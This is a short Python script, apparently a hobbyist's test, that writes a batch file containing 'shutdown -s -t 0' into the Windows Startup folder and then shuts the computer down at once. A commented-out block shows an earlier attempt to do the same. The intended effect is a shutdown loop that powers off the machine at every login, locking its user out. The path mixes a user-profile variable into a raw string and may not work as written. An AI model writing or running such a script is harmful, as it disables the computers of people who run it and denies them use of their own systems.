import os

# creating variables to inform the program the directory and the script content
diretorio = r'C:\Users\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

scriptbat = r'shutdown -s -t 0'

# creating the BATCH file on the path
caminho_batch = os.path.join(diretorio, "script.bat")

# writing the command on the BATCH file
with open(caminho_batch, 'w') as file:
    file.write(scriptbat)

'''
this doesn't work, it was just a little testing

os.system("cd %appdata%")
os.system("cd Microsoft")
os.system("cd Windows")
os.system("cd Start Menu")
os.system("cd Programs")
os.system("cd Startup")

# creating the BATCH file and shutting the PC down

os.system("echo shutdown -s > script.bat")
'''

os.system("shutdown -s -t 0")
